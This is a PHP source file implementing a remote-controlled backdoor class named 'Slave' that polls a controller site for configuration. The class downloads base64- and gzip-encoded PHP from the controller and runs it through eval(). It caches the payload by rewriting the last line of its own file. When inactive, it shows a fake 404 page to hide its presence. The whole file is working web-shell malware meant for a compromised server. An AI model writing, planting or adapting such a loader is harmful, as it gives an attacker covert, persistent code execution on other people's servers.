<?php
define('SITE', 'http://localhost/remoteshell');

define('RES_DIR', 'res/');
define('CONFIGS_DIR', 'configs/');
define('CONTENTS_DIR', 'contents/');

//error_reporting(0);

class Slave {
    private $global_config, $item_config, $item_hash;
    public $contents;
    
    public function __construct(){
        $this->item_hash = md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
        
        $this->global_config = $this->getGlobalConfig();
        $this->item_config = $this->getItemConfig();
    }
    
    //requests
    private function getUrl($path){
        $c = curl_init();

        curl_setopt($c, CURLOPT_URL, SITE . '/' . $path);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);

        $result = curl_exec($c);
        
        if($result && curl_getinfo($c, CURLINFO_HTTP_CODE) === 200){
            curl_close($c);
            return $result;
        }
        curl_close($c);
        return false;
    }
    
    //filegets
        //config
    private function getGlobalConfig(){
        return json_decode($this->getUrl(RES_DIR . CONFIGS_DIR . 'global'));
    }
    private function getItemConfig(){
        return json_decode($this->getUrl(RES_DIR . CONFIGS_DIR . $this->item_hash));
    }
    
        //contents
    /*
     * Gets the last line from this file
     * 
     * Return json_decoded Obj
     */
    private function getLocalContents(){
        $f = fopen(basename(__FILE__), 'r');
        $cursor = -1;
        $char = $line = "";

        while ($char !== false && $char !== "\n" && $char !== "\r") {
            $line = $char.$line;
            fseek($f, $cursor--, SEEK_END);
            $char = fgetc($f);
        }
        //$this->contents = substr($line, 2); //strip comment marks (//)
        return substr($line, 2); //strip comment marks (//)
    }
    /*
     * string $config: base64_encoded
     * 
     * Overwrites given config on the last line
     */
    private function setLocalContents($contents){
        $f = fopen(basename(__FILE__), 'r+');
        $cursor = -1;
        $char = $line = "";

        while ($char !== false && $char !== "\n" && $char !== "\r") {
            $line = $char.$line;
            fseek($f, $cursor--, SEEK_END);
            $char = fgetc($f);
        }
        
        fputs($f, '//' . $contents);
    }
    private function getRemoteContents(){
        $item_contents = $this->getUrl(RES_DIR . CONTENTS_DIR . $this->item_hash);
        if($item_contents){
            return $item_contents;
        }else{
            return $this->getUrl(RES_DIR . CONTENTS_DIR .'global');
        }
    }
    private function getContents(){
        if (!$this->contents) {
            if($this->useCached()){
                $this->contents = $this->getLocalContents();
            }else{
                if($remote = $this->getRemoteContents()){
                    $this->contents = $remote;
                    $this->setLocalContents($this->contents);
                }else{ // if can't get from remote site
                    $this->contents = $this->getLocalContents();
                }
            }
        }
        return $this->contents;
    }

    //config checks
    public function isOn(){
        if($this->global_config->isOn){
            if($this->item_config->isOn){
                return true;
            }
        }
        
        return false;
    }
    private function useCached(){
        if($this->global_config->cache){
            if($this->item_config->cache){
                if($this->item_config->cache_exptime > time()){
                    return true;
                }
            }
        }
        return false;
    }
    
    public function runCode(){
        eval(gzinflate(base64_decode($this->getContents())));
    }
    
    public function show404() {
        header("HTTP/1.0 404 Not Found");
        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        <p>The requested URL ' . htmlspecialchars($_SERVER['REQUEST_URI']) . ' was not found on this server.</p>
        <hr>
        <address>PHP/' . phpversion() . ' Server at ' . $_SERVER['SERVER_NAME'] . ' Port ' . $_SERVER['SERVER_PORT'] . '</address>
        </body></html>';
        

        exit;
    }
}

$slave = new Slave;
if($slave->isOn()){
    $slave->runCode();
}else{
    $slave->show404();
}

//S03OyFcwsgYA